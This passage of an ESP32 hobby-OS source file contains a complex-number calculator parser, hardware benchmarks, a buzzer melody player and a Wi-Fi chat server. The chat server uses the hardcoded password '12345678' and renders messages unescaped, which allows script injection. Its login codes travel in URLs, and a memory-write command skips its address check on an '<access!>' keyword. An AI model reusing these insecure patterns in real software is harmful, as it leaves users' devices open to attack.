    if (d == 0) return {NAN, NAN}; // 0으로 나누기 방어
    return {(a.r * b.r + a.i * b.i) / d, (a.i * b.r - a.r * b.i) / d};
}
Complex c_pow(Complex a, Complex b) {
    if (a.r == 0 && a.i == 0) return {0, 0};
    double arg = atan2(a.i, a.r);
    double log_r = 0.5 * log(a.r * a.r + a.i * a.i);
    double real_p = exp(b.r * log_r - b.i * arg);
    double im_p = b.r * arg + b.i * log_r;
    return {real_p * cos(im_p), real_p * sin(im_p)};
}
Complex c_exp(Complex a) {
    double e = exp(a.r);
    return {e * cos(a.i), e * sin(a.i)};
}
Complex c_log(Complex a) {
    return {0.5 * log(a.r * a.r + a.i * a.i), atan2(a.i, a.r)};
}
Complex c_sin(Complex a) { return {sin(a.r) * cosh(a.i), cos(a.r) * sinh(a.i)}; }
Complex c_cos(Complex a) { return {cos(a.r) * cosh(a.i), -sin(a.r) * sinh(a.i)}; }
Complex c_tan(Complex a) { return c_div(c_sin(a), c_cos(a)); }

// ==========================================
// 파서 전방 선언
// ==========================================
Complex pExpr(const char*& e);
Complex pTerm(const char*& e);
Complex pPower(const char*& e);
Complex pFact(const char*& e);

// ==========================================
// Ardudows 뇌절 특수 기능 엔진
// ==========================================

// 🚀 1. 복소수 기반 2D 그래프 렌더러
void plotGraph(String expr) {
    tft.fillScreen(TFT_BLACK);
    // 모눈종이 배경
    for(int i=0; i<tft.width(); i+=20) tft.drawLine(i, 0, i, tft.height(), 0x2104);
    for(int i=0; i<tft.height(); i+=20) tft.drawLine(0, i, tft.width(), i, 0x2104);
    tft.drawLine(tft.width()/2, 0, tft.width()/2, tft.height(), TFT_WHITE);
    tft.drawLine(0, tft.height()/2, tft.width(), tft.height()/2, TFT_WHITE);

    double prev_py = NAN;
    for (int px = 0; px < tft.width(); px++) {
        double x_val = (px - tft.width()/2.0) / 20.0;
        String cur = expr;
        cur.replace("x", "(" + String(x_val, 6) + ")");
        const char* p = cur.c_str();
        Complex res = pExpr(p); 

        // 결과의 실수부만 Y축에 매핑
        int py = tft.height()/2 - (int)(res.r * 20.0); 
        if (!isnan(prev_py) && py >= 0 && py < tft.height() && prev_py >= 0 && prev_py < tft.height()) {
            tft.drawLine(px-1, (int)prev_py, px, py, TFT_YELLOW);
        }
        prev_py = (double)py;
        if(px % 5 == 0) yield(); // ESP32-S3 Watchdog 타이머 리셋
    }
}

// 🚀 2. 무한 소수 사냥 (Prime Hunt)
void primeHunt() {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0,0);
    tft.println(">> PRIME HUNTING...");
    unsigned long n = 2;
    while(true) {
        bool isP = true;
        for(unsigned long i=2; i*i<=n; i++) {
            if(n % i == 0) { isP = false; break; }
        }
        if(isP) {
            tft.setTextColor(random(0x07E0, 0xFFFF)); 
            tft.print(String(n) + " ");
        }
        n++;
        // PS/2 ESC 중단 로직 자리: if(get_raw_ps2_sc() == 0x76) break;
        if(n % 50 == 0) yield();
    }
}

// 🚀 3. 원주율 극한 스트림
void piInfinite() {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0,0);
    tft.setTextColor(TFT_GREEN);
    tft.println(">> PI STREAM (Infinite Series)");
    double pi = 0;
    for(long k=0; k<100000; k++) {
        pi += (k % 2 == 0 ? 1.0 : -1.0) / (2.0 * k + 1.0);
        if(k % 10 == 0) {
            tft.print(String(pi * 4.0, 7) + ".. ");
            if(tft.getCursorY() > tft.height()-10) tft.setCursor(0,0); // 화면 넘어가면 리셋
        }
        yield();
    }
}

// ==========================================
// 메인 진입점: Profecalc
// ==========================================
void Profecalc(String input) {
    input.trim();
    
    // 특수 명령어 감지
    if (input.startsWith("plot ")) { plotGraph(input.substring(5)); return; }
    if (input == "prime") { primeHunt(); return; }
    if (input == "pi_inf") { piInfinite(); return; }

    // 일반 수식 계산 (공백 제거 및 상수 치환)
    input.replace(" ", "");
    input.replace("PI", String(M_PI, 10));
    const char* p = input.c_str();
    
    tft.setTextColor(TFT_CYAN);
    tft.print(">> EVAL: ");
    tft.setTextColor(TFT_WHITE);
    tft.println(input);

    Complex res = pExpr(p);

    tft.print(">> ANS: ");
    if (isnan(res.r)) {
        tft.setTextColor(TFT_RED);
        tft.println("Math Error (NaN)");
    } else {
        tft.setTextColor(TFT_GREEN);
        tft.print(res.r, 15);
        if (abs(res.i) > 0.000000000000001) { // 허수부가 존재하면 복소수 형태로 출력
            tft.print(res.i >= 0 ? " + " : " - ");
            tft.print(abs(res.i), 6);
            tft.println("i");
        } else {
            tft.println("");
        }
    }
}

// ==========================================
// 구문 분석기 (재귀적 하향 파서)
// ==========================================
Complex pExpr(const char*& e) {
    Complex res = pTerm(e);
    while (*e == '+' || *e == '-') {
        char op = *e++;
        if (op == '+') res = c_add(res, pTerm(e));
        else res = c_sub(res, pTerm(e));
    }
    return res;
}

Complex pTerm(const char*& e) {
    Complex res = pPower(e);
    while (*e == '*' || *e == '/') {
        char op = *e++;
        if (op == '*') res = c_mul(res, pPower(e));
        else res = c_div(res, pPower(e));
    }
    return res;
}

Complex pPower(const char*& e) {
    Complex res = pFact(e);
    if (*e == '^') {
        e++;
        res = c_pow(res, pPower(e)); // 우측 결합성(Right-associative)을 위한 재귀
    }
    return res;
}

Complex pFact(const char*& e) {
    while (*e == ' ') e++;
    
    // 단항 부호 처리
    if (*e == '+') { e++; return pFact(e); }
    if (*e == '-') { e++; Complex v = pFact(e); return {-v.r, -v.i}; }
    
    // 괄호 처리
    if (*e == '(') {
        e++; 
        Complex v = pExpr(e);
        if (*e == ')') e++;
        return v;
    }
    
    // 복소수 지원 수학 함수들
    if (strncmp(e, "exp", 3) == 0)  { e += 3; return c_exp(pFact(e)); }
    if (strncmp(e, "sqrt", 4) == 0) { e += 4; return c_pow(pFact(e), {0.5, 0}); }
    if (strncmp(e, "sin", 3) == 0)  { e += 3; return c_sin(pFact(e)); }
    if (strncmp(e, "cos", 3) == 0)  { e += 3; return c_cos(pFact(e)); }
    if (strncmp(e, "tan", 3) == 0)  { e += 3; return c_tan(pFact(e)); }
    if (strncmp(e, "log", 3) == 0 || strncmp(e, "ln", 2) == 0) { 
      if (strncmp(e, "log", 3) == 0) e += 3; else e += 2; // 확실하게 글자 수만큼 포인터 이동
      return c_log(pFact(e)); 
    }

    // 허수 단위 'i' 단독 처리 (예: i*PI)
    if (*e == 'i') { e++; return {0, 1}; }

    // 숫자 파싱
    char* end;
    double r = strtod(e, &end);
    e = end;
    
    // 숫자 바로 뒤에 i가 붙는 경우 처리 (예: 5i)
    if (*e == 'i') { e++; return {0, r}; }
    
    return {r, 0};
}

/**
 * pz(frequency, duration)
 * @param freq: 주파수 (Hz) - 숫자가 높을수록 고음! (마리오는 100~2000 사이)
 * @param ms: 소리가 지속될 시간 (밀리초)
 */
void pz(int freq, int ms) {
  // 12번 핀을 통해 주파수를 출력합니다.
  tone(12, freq); 
  
  // 지정된 시간만큼 대기 (소리가 유지됨)
  delay(ms);      
  
  // 소리를 끕니다. (상남자는 끝맺음도 확실히! ㅋㅋㅋㅋ)
  noTone(12);     
}

// --- [ 221 피아노 주파수 매핑 테이블 ] ---
// 도(1) 레(2) 미(3) 파(4) 솔(5) 라(6) 시(7) 도(8)
int scale[] = {0, 262, 294, 330, 349, 392, 440, 494, 523};

/**
 * cmd: "12345_1" 같은 형식의 문자열
 * ms: 각 음의 길이 (기본 300ms)
 */
void playMelody(String cmd, int ms = 300) {
  logToTFT("[PIANO] Playing: " + cmd, TFT_CYAN); // TFT에 로그 똬악!
  
  for (int i = 0; i < cmd.length(); i++) {
    char note = cmd.charAt(i);

    if (note >= '1' && note <= '8') {
      int n = note - '0'; // 문자를 숫자로 변환
      pz(scale[n], ms);   // 형님이 만든 pz 함수 호출! ㅋㅋㅋㅋ
    } 
    else if (note == '_') {
      delay(ms); // 쉼표는 그냥 대기!
    }
    
    // 음 사이의 아주 미세한 간격 (상남자의 리듬감 ㅋㅋㅋㅋ)
    delay(50); 
  }
  
  tft.println("[PIANO] Done!");
}

// --- [ DS1302 상남자식 직접 제어 섹션 ] ---
  
/*
void rtc_write_byte(uint8_t data) {
  pinMode(my_rtc_dat, OUTPUT);
  for (int i = 0; i < 8; i++) {
    digitalWrite(my_rtc_dat, (data >> i) & 0x01);
    digitalWrite(my_rtc_clk, HIGH); delayMicroseconds(1);
    digitalWrite(my_rtc_clk, LOW);  delayMicroseconds(1);
  }
}

uint8_t rtc_read_byte() {
  uint8_t data = 0;
  pinMode(my_rtc_dat, INPUT);
  for (int i = 0; i < 8; i++) {
    digitalWrite(my_rtc_clk, HIGH); delayMicroseconds(1);
    if (digitalRead(my_rtc_dat)) data |= (1 << i);
    digitalWrite(my_rtc_clk, LOW);  delayMicroseconds(1);
  }
  return data;
}

void initRTC() {
  pinMode(my_rtc_rst, OUTPUT);
  pinMode(my_rtc_clk, OUTPUT);
  pinMode(my_rtc_dat, OUTPUT);
  digitalWrite(my_rtc_rst, LOW);
  digitalWrite(my_rtc_clk, LOW);
  tft.println(">> RTC(15,4,5) ONLINE.");
}

// --- [ 3. 이제 함수는 깔끔하게! ] ---
String getNowTime() {
  // 배열 안 쓰고 변수 7개로 직접 받기 (절대 안 겹칠 이름 ㅋㅋㅋㅋ)
  uint8_t r1, r2, r3, r4, r5, r6, r7;

  digitalWrite(my_rtc_rst, HIGH);
  rtc_write_byte(0xBF); 
  
  r1 = rtc_read_byte(); // 초
  r2 = rtc_read_byte(); // 분
  r3 = rtc_read_byte(); // 시
  r4 = rtc_read_byte(); // 일
  r5 = rtc_read_byte(); // 월
  r6 = rtc_read_byte(); // 요일 (안 씀)
  r7 = rtc_read_byte(); // 년
  
  digitalWrite(my_rtc_rst, LOW);

  // BCD -> Decimal 계산
  int s = (r1 & 0x0F) + ((r1 & 0x70) >> 4) * 10;
  int m = (r2 & 0x0F) + ((r2 & 0x70) >> 4) * 10;
  int h = (r3 & 0x0F) + ((r3 & 0x30) >> 4) * 10;
  int d = (r4 & 0x0F) + ((r4 & 0x30) >> 4) * 10;
  int mo = (r5 & 0x0F) + ((r5 & 0x10) >> 4) * 10;
  int y = (r7 & 0x0F) + ((r7 & 0xF0) >> 4) * 10 + 2000;

  // String 더하기로 깔끔하게 리턴 ㅋㅋㅋㅋ
  String res = "";
  res += String(y) + "-";
  if(mo < 10) res += "0"; res += String(mo) + "-";
  if(d < 10) res += "0"; res += String(d) + " ";
  if(h < 10) res += "0"; res += String(h) + ":";
  if(m < 10) res += "0"; res += String(m) + ":";
  if(s < 10) res += "0"; res += String(s);
  
  return res;
}
*/

// ================== ARS FUNCTIONS ==================

void ars_mem() {
  size_t freeHeap = ESP.getFreeHeap();
  size_t maxBlock = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT); // 핵심!

  tft.println("=== ARS MEMORY ===");
  tft.printf("Free: %d\n", freeHeap);
  tft.printf("Max Block: %d\n", maxBlock);

  // TCP 할당은 보통 10~20KB 이상의 연속된 공간을 필요로 함
  if (maxBlock < 15000) { 
    tft.println("!! CRITICAL FRAGMENTATION !!");
    tft.println("System might crash on Web access");
  }
}

void ars_temp() {
  float temp = temperatureRead();

  tft.println("=== ARS TEMP ===");
  tft.printf("CPU Temp: %.2f C\n", temp);

  if (temp > 70) {
    tft.println("!! OVERHEAT WARNING");
  }
}

void ars_wifi() {
  tft.println("=== ARS WIFI ===");

  if (WiFi.status() != WL_CONNECTED) {
    tft.println("Disconnected. Reconnecting...");
    WiFi.reconnect();
  } else {
    tft.println("WiFi OK");
  }
}

void ars_check() {
  tft.println("=== ARS CHECK ===");
  tft.printf("Heap: %d\n", ESP.getFreeHeap());
  tft.printf("PSRAM: %d\n", ESP.getFreePsram());
  tft.printf("Uptime: %lu sec\n", millis() / 1000);
  tft.printf("WiFi: %s\n", WiFi.status() == WL_CONNECTED ? "OK" : "DOWN");
}

void ars_purge() {
  tft.println("=== ARS EMERGENCY PURGE ===");
  
  // 1. 웹소켓 클라이언트 강제 정리 (메모리 잡아먹는 주범)
  ws.cleanupClients(); 
  
  // 2. 만약 채팅 파일등이 열려있다면 강제 종료 시도 (파일 핸들 부족 방지)
  // 3. 시리얼 버퍼 비우기
  Serial.flush();
  
  tft.println("Purging Memory fragments...");
  // 힙 메모리를 정리하기 위해 작은 할당과 해제를 반복하거나, 
  // 내부 lwIP 타이머를 잠시 돌려줍니다.
  delay(200); 

  tft.printf("Final Heap: %d\n", ESP.getFreeHeap());
  tft.println("Done.");
}

// -------------------------
// MAIN PERF TESTER
// -------------------------
void perf_tester(PerfMode mode, String confirm, int durationSec) {

  if (!isYes(confirm)) {
    tft.println("ACCESS DENIED");
    return;
  }

  unsigned long start = millis();

  while (millis() - start < durationSec * 1000) {

    switch (mode) {

      case MODE_CPU: stress_cpu(); break;
      case MODE_FPU: stress_fpu(); break;
      case MODE_SCREEN: stress_screen(); break;
      case MODE_SRAM: stress_sram(); break;
      case MODE_PSRAM: stress_psram(); break;
      case MODE_SD: stress_sd(); break;
      case MODE_VECTOR: stress_vector(); break;
      case MODE_FPS: stress_fps(); break;
      case MODE_FRAME: stress_frame(); break;
      case MODE_FULL: stress_full(); break;

      case MODE_TINY:
        tft.println("TINY MODE (not implemented)");
        break;
    }
  }

  tft.println("TEST COMPLETE");
}

// -------------------------
// YES CHECK
// -------------------------
bool isYes(String v) {
  v.toLowerCase();
  v.trim();
  return (v == "=y" || v == "=yes");
}

// -------------------------
// GRADE SYSTEM
// -------------------------
String getGrade(float score) {

  if (score >= 95) return "A+";
  if (score >= 90) return "A";
  if (score >= 85) return "A-";

  if (score >= 80) return "B+";
  if (score >= 75) return "B";
  if (score >= 70) return "B-";

  if (score >= 60) return "C";
  if (score >= 50) return "D";
  if (score >= 30) return "E";

  return "F-";
}

// -------------------------
// STRESS FUNCTIONS
// -------------------------

// =========================
// STRESS FUNCTIONS (MEASURED)
// =========================

// CPU
void stress_cpu() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.println("CPU BENCH");

  unsigned long t = micros();

  volatile long x = 1;
  for (int i = 0; i < 1000000; i++) {
    x = (x * 31 + i) % 1000003;
  }

  unsigned long dt = micros() - t;

  tft.printf("TIME: %lu us\n", dt);
  tft.printf("SCORE: %ld\n", 100000000 / (dt + 1));
}

// FPU
void stress_fpu() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.println("FPU BENCH");

  unsigned long t = micros();

  volatile float x = 1.0001;
  for (int i = 0; i < 100000; i++) {
    x = sin(x) * cos(x) + tan(x + 0.0001);
  }

  unsigned long dt = micros() - t;

  tft.printf("TIME: %lu us\n", dt);
  tft.printf("SCORE: %ld\n", 10000000 / (dt + 1));
}

// SRAM
void stress_sram() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.println("SRAM BENCH");

  unsigned long t = micros();

  volatile int arr[1000];
  for (int i = 0; i < 1000; i++) arr[i] = i * i;

  unsigned long dt = micros() - t;

  tft.printf("TIME: %lu us\n", dt);
}

// PSRAM
void stress_psram() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.println("PSRAM BENCH");

  unsigned long t = micros();

  volatile int arr[5000];
  for (int i = 0; i < 5000; i++) arr[i] = i;

  unsigned long dt = micros() - t;

  tft.printf("TIME: %lu us\n", dt);
}

// VECTOR (S3 핵심)
void stress_vector() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_ORANGE, TFT_BLACK);
  tft.println("VECTOR BENCH");

  unsigned long t = micros();

  volatile float x = 1, y = 2, z = 3;

  for (int i = 0; i < 100000; i++) {
    x += y * 1.001;
    y += z * 1.002;
    z += x * 1.003;
  }

  unsigned long dt = micros() - t;

  tft.printf("TIME: %lu us\n", dt);
  tft.printf("SCORE: %ld\n", 10000000 / (dt + 1));
}

// SCREEN
void stress_screen() {
  tft.fillScreen(TFT_BLACK);

  for (int i = 0; i < 1000; i++) {
    tft.drawPixel(random(480), random(320), TFT_WHITE);
  }
}

// FPS
void stress_fps() {
  tft.fillScreen(TFT_BLACK);

  unsigned long start = millis();
  int frames = 0;

  while (millis() - start < 1000) {
    tft.fillScreen(TFT_BLACK);

    for (int i = 0; i < 50; i++) {
      tft.drawPixel(random(480), random(320), TFT_WHITE);
    }

    frames++;
  }

  tft.setCursor(0, 0);
  tft.setTextColor(TFT_GREEN);
  tft.printf("FPS: %d\n", frames);
}

void stress_sd() {

  unsigned long start = millis();

  File f = SD.open("/test_perf.txt", FILE_WRITE);
  if (!f) {
    tft.println("SD OPEN FAIL");
    return;
  }

  // WRITE TEST
  for (int i = 0; i < 500; i++) {
    f.println("ARDUDOWS_SD_TEST_" + String(i));
  }
  f.close();

  // READ TEST
  f = SD.open("/test_perf.txt");
  int count = 0;

  while (f.available()) {
    f.readStringUntil('\n');
    count++;
  }
  f.close();

  // DELETE TEST
  SD.remove("/test_perf.txt");

  unsigned long t = millis() - start;

  tft.printf("SD TEST DONE: %lu ms (%d lines)\n", t, count);
}

// FRAME TIME
void stress_frame() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);

  unsigned long t = micros();

  for (int i = 0; i < 1000; i++) {
    volatile int x = i * i;
  }

  unsigned long dt = micros() - t;

  tft.setTextColor(TFT_MAGENTA);
  tft.printf("FRAME TIME: %lu us\n", dt);
}

// FULL
void stress_full() {
  stress_cpu();
  stress_fpu();
  stress_sram();
  stress_psram();
  stress_vector();
  stress_fps();
  stress_frame();
}

// -------------------------
// SCORE CALCULATION
// -------------------------
float calc_score(float fps, float cpu) {
  return (fps * 0.6) + ((100 - cpu) * 0.4);
}

// ================== 전역 변수 & 서버 설정 ==================

String myAP = "Ardudows_Share";
String myPW = "12345678";

#define USERS "/Ardudows/Assets/Share/users.txt"
#define ROOM "/Ardudows/Assets/Share/rooms/room1"
#define CHAT_FILE "/Ardudows/Assets/Share/rooms/room1/chat.txt"

// ================== 유틸 함수 ==================
String nowTime() { return String(millis() / 1000); }

String makeCode() {
  const char* c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  String r = "";
  for (int i = 0; i < 6; i++) r += c[random(0, 36)];
  return r;
}

void ensure() {
  SD.mkdir("/Ardudows");
  SD.mkdir("/Ardudows/Assets");
  SD.mkdir("/Ardudows/Assets/Share");
  SD.mkdir("/Ardudows/Assets/Share/rooms");
  SD.mkdir(ROOM);
}

void clearChat() {
  if (xSemaphoreTake(sdMutex, portMAX_DELAY)) {
    SD.remove(CHAT_FILE);
    xSemaphoreGive(sdMutex);
  }
}

String getServerStatus() {
  return "{\"heap\":" + String(ESP.getFreeHeap()) + ",\"psram\":" + String(ESP.getFreePsram()) + "}";
}

String dmPath(String a, String b) {
  if (a < b) return "/Ardudows/Assets/Share/dm/" + a + "_" + b + ".txt";
  else return "/Ardudows/Assets/Share/dm/" + b + "_" + a + ".txt";
}

// ================== 계정 관리 (Mutex 완벽 적용) ==================
String createUser(String name) {
  if (!xSemaphoreTake(sdMutex, pdMS_TO_TICKS(1000))) return "ERR";
  File f = SD.open(USERS, FILE_APPEND);
  if (!f) { xSemaphoreGive(sdMutex); return "ERR"; }

  String uid = "u" + String(millis());
  String code = makeCode();
  f.println(uid + "|" + name + "|" + code);
  f.close();
  xSemaphoreGive(sdMutex);
  return uid + "|" + name + "|" + code;
}

String dologinUser(String code) {
  if (!xSemaphoreTake(sdMutex, pdMS_TO_TICKS(1000))) return "";
  File f = SD.open(USERS);
  if (!f) { xSemaphoreGive(sdMutex); return ""; }

  while (f.available()) {
    String l = f.readStringUntil('\n');
    int a = l.indexOf("|");
    int b = l.indexOf("|", a + 1);
    if (a < 0 || b < 0) continue;

    String uid = l.substring(0, a);
    String name = l.substring(a + 1, b);
    String c = l.substring(b + 1); c.trim();

    if (c == code) {
      f.close();
      xSemaphoreGive(sdMutex);
      return uid + "|" + name;
    }
    yield();
  }
  f.close();
  xSemaphoreGive(sdMutex);
  return "";
}

// ================== 채팅 & DM 파일 쓰기 ==================
void addChat(String u, String m) {
  if (xSemaphoreTake(sdMutex, portMAX_DELAY)) {
    File f = SD.open(CHAT_FILE, FILE_APPEND);
    if (f) { f.println(u + "|" + nowTime() + "|" + m); f.close(); }
    xSemaphoreGive(sdMutex);
  }
}

void sendDM(String a, String b, String m) {
  if (xSemaphoreTake(sdMutex, portMAX_DELAY)) {
    File f = SD.open(dmPath(a, b), FILE_APPEND);
    if (f) { f.println(a + "|" + nowTime() + "|" + m); f.close(); }
    xSemaphoreGive(sdMutex);
  }
}

// ================== (핵심1) 스트리밍 파일 읽기 (tcp_alloc 해결) ==================
// 함수 선언부에서 뒤의 두 인자에 기본값(="" )을 줍니다.
void handleChatStream(AsyncWebServerRequest *request, bool isDM, String uA = "", String uB = "") {
  if (!xSemaphoreTake(sdMutex, pdMS_TO_TICKS(1000))) {
    request->send(503, "text/plain", "BUSY"); return;
  }

  String path = isDM ? dmPath(uA, uB) : CHAT_FILE;
  File f = SD.open(path);
  if (!f) {
    xSemaphoreGive(sdMutex);
    request->send(200, "application/json", "[]"); return;
  }

  // [수정 포인트] AsyncWebServerResponse 대신 AsyncResponseStream을 사용!
  AsyncResponseStream *response = request->beginResponseStream("application/json");
  
  response->print("["); // 이제 에러 안 납니다!
  bool first = true;
  int cnt = 0;

  while (f.available()) {
    String l = f.readStringUntil('\n');
    int a = l.indexOf("|");
    int b = l.indexOf("|", a + 1);
    if (a < 0 || b < 0) continue;

    if (!first) response->print(",");
    response->printf("{\"u\":\"%s\",\"m\":\"%s\"}", l.substring(0, a).c_str(), l.substring(b + 1).c_str());
    first = false;
    
    if(++cnt % 10 == 0) yield(); 
  }
  response->print("]");
  f.close();
  xSemaphoreGive(sdMutex);
  request->send(response);
}

// ================== (핵심2) 웹소켓 이벤트 핸들러 ==================
void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_DATA) {
    AwsFrameInfo *info = (AwsFrameInfo*)arg;
    if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
      data[len] = 0;
      String msg = (char*)data; // 형식: ROOM|uid|메시지  또는  DM|uid|target|메시지
      
      int s1 = msg.indexOf('|');
      int s2 = msg.indexOf('|', s1 + 1);
      
      if (s1 > 0 && s2 > 0) {
        String mType = msg.substring(0, s1);
        String from = msg.substring(s1 + 1, s2);
        String text = msg.substring(s2 + 1);
        
        if (mType == "ROOM") {
          addChat(from, text);
          // 모든 접속자에게 브로드캐스트
          ws.textAll("{\"type\":\"room\",\"u\":\"" + from + "\",\"m\":\"" + text + "\"}");
        } 
        else if (mType == "DM") {
          int s3 = text.indexOf('|');
          if (s3 > 0) {
            String to = text.substring(0, s3);
            String actMsg = text.substring(s3 + 1);
            sendDM(from, to, actMsg);
            // DM도 브로드캐스트 하되, 프론트엔드에서 걸러냄
            ws.textAll("{\"type\":\"dm\",\"from\":\"" + from + "\",\"to\":\"" + to + "\",\"m\":\"" + actMsg + "\"}");
          }
        }
      }
    }
  }
}

// ================== WEB HTML (웹소켓 적용) ==================
const char html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:black;color:#0f0;font-family:monospace;}
#chat{height:300px;overflow:auto;border:1px solid #0f0;padding:5px;margin-bottom:10px;}
.msg{margin:5px;padding:6px;border-radius:8px;max-width:70%; word-break:break-all;}
.me{background:#0a0;margin-left:auto;color:black;font-weight:bold;}
.other{background:#222;color:#0f0;}
input, button {background:#111;color:#0f0;border:1px solid #0f0;padding:5px;}
button:hover {background:#0f0;color:black;}
</style>
</head>
<body>

<h3>Ardudows Server</h3>

<div id="login">
<input id="name" placeholder="닉네임">
<button onclick="signup()">가입</button>
<input id="code" placeholder="코드">
<button onclick="login()">로그인</button>
</div>

<div id="main" style="display:none;">
  <button onclick="changeMode('room')">공용방</button>
  <input id="target" placeholder="상대ID" style="width:80px;">
  <button onclick="changeMode('dm')">DM</button>
  <button onclick="fetch('/clear').then(()=>alert('청소 완료!'))">방 엎기</button>
  <button onclick="checkStatus()">상태</button>
  <div id="statusTxt" style="font-size:12px;color:yellow;margin-top:5px;"></div>
</div>

<div id="chatUI" style="display:none;margin-top:10px;">
  <div id="chat"></div>
  <input id="msg" placeholder="메시지..." style="width:60%;" onkeypress="if(event.keyCode==13) send()">
  <button onclick="send()">전송</button>
</div>

<script>
let mode="room";
let me="";
let target="";
let socket;

function initWS(){
  socket = new WebSocket('ws://' + window.location.hostname + '/ws');
  socket.onmessage = function(e){
    let d = JSON.parse(e.data);
    if(d.type === "room" && mode === "room"){
      appendMsg(d.u, d.m);
    } else if(d.type === "dm" && mode === "dm"){
      if((d.from === me && d.to === target) || (d.to === me && d.from === target)){
        appendMsg(d.from, d.m);
      }
    }
  };
}

function signup(){ fetch('/signup?name='+name.value).then(r=>r.text()).then(t=>alert("코드: "+t)); }

function login(){
 fetch('/login?code='+code.value).then(r=>r.text()).then(t=>{
  if(t=="fail" || t=="") alert("실패!");
  else{
    me=t.split("|");
    document.getElementById("login").style.display="none";
    document.getElementById("main").style.display="block";
    document.getElementById("chatUI").style.display="block";
    initWS();
    loadHistory(); // 첫 접속 시 과거 내역 불러오기
  }
 });
}

function changeMode(m){
  mode = m;
  if(mode === "dm"){
    target = document.getElementById("target").value;
    if(!target){ alert("상대ID 입력!"); mode='room'; return; }
  }
  loadHistory();
}

// 과거 대화는 스트리밍(HTTP)으로 안전하게 가져옴 (setInterval 뺐음!)
function loadHistory(){
  let url = (mode === "room") ? '/chat' : `/dm?a=${me}&b=${target}`;
  fetch(url).then(r=>r.json()).then(d=>{
    document.getElementById("chat").innerHTML = "";
    d.forEach(e => appendMsg(e.u, e.m));
  });
}

function appendMsg(u, m){
  let cls = (u === me) ? "msg me" : "msg other";
  let c = document.getElementById("chat");
  c.insertAdjacentHTML('beforeend', `<div class="${cls}">[${u}] ${m}</div>`);
  c.scrollTop = c.scrollHeight;
}

function send(){
  let m = document.getElementById("msg").value;
  if(!m) return;
  // 웹소켓으로 메시지 쏘기! (메모리 낭비 제로)
  if(mode === "room") socket.send("ROOM|" + me + "|" + m);
  else socket.send("DM|" + me + "|" + target + "|" + m);
  document.getElementById("msg").value = "";
}

function checkStatus(){
 fetch('/status').then(r=>r.json()).then(d=> document.getElementById('statusTxt').innerText = `Heap:${d.heap} / PSRAM:${d.psram}`);
}
</script>
</body>
</html>
)rawliteral";

// ================== SETUP (Web_Drive) ==================
void Web_Drive() {
  sdMutex = xSemaphoreCreateMutex();

  if (!SD.begin()) { Serial.println("SD FAIL"); return; }
  ensure();

  WiFi.softAP(myAP.c_str(), myPW.c_str());
  Serial.println(WiFi.softAPIP());
  delay(1000);

  // 웹소켓 설정 장착
  ws.onEvent(onWsEvent);
  server.addHandler(&ws);

  // HTML 메인
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", html); });
  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *r) { r->send(200, "application/json", getServerStatus()); });
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *r) { clearChat(); r->send(200, "text/plain", "OK"); });
  server.on("/signup", HTTP_GET, [](AsyncWebServerRequest *r) { r->send(200, "text/plain", createUser(r->getParam("name")->value())); });
  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *r) {
    if (!r->hasParam("code")) { r->send(400, "text/plain", "Err"); return; }
    String res = dologinUser(r->getParam("code")->value());
    r->send(200, "text/plain", res == "" ? "fail" : res);
  });

  // 채팅 내역 불러오기 (스트리밍 방식 적용!)
  server.on("/chat", HTTP_GET, [](AsyncWebServerRequest *r) { handleChatStream(r, false); });
  server.on("/dm", HTTP_GET, [](AsyncWebServerRequest *r) { handleChatStream(r, true, r->getParam("a")->value(), r->getParam("b")->value()); });

  server.begin();
}

// [상남자 가이드] ESP32-S3 SRAM 안전 구역 설정
const uint32_t SAFE_START = 0x3FC80000;
const uint32_t SAFE_END   = 0x3FCFFFFF;

// 지능형 파서: 0x10, 16, 'A'를 모두 uint8_t로 변환
uint8_t parseSmartValue(String val) {
    val.trim();
    if (val.startsWith("'") && val.endsWith("'") && val.length() >= 3) {
        return (uint8_t)val.charAt(1); // 아스키 ('A') 처리
    } else if (val.startsWith("0x") || val.startsWith("0X")) {
        return (uint8_t)strtoul(val.c_str(), NULL, 16); // 16진수 처리
    } else {
        return (uint8_t)val.toInt(); // 10진수 처리
    }
}

void cmd_ram(String input) {
    // 1. 보안 체크 (access! 키워드 확인)
    bool isForce = input.indexOf("<access!>") != -1;
    if (isForce) input.replace("<access!>", "");
    input.trim();

    // 2. 명령어 및 인자 분리
    int firstSpace = input.indexOf(' ');
    if (firstSpace == -1 && input != "listing") return; 

    String subCmd = (firstSpace == -1) ? input : input.substring(0, firstSpace);
    String args = (firstSpace == -1) ? "" : input.substring(firstSpace + 1);
    args.trim();

    // --- [ 기능 1: WRITE ] ---
    if (subCmd == "write") {
        int nextSpace = args.indexOf(' ');
        if (nextSpace == -1) { tft.println("Usage: ram write [addr] [val]"); return; }

        uint32_t addr = strtoul(args.substring(0, nextSpace).c_str(), NULL, 16);
        String valStr = args.substring(nextSpace + 1);
        valStr.trim(); // 뒤에 남은 공백 찌꺼기 완벽 제거
        uint8_t val = parseSmartValue(valStr);

        if (!isForce && (addr < SAFE_START || addr > SAFE_END)) {
            tft.println("ACCESS DENIED! Use <access!>"); return;
        }
        *(volatile uint8_t*)addr = val;
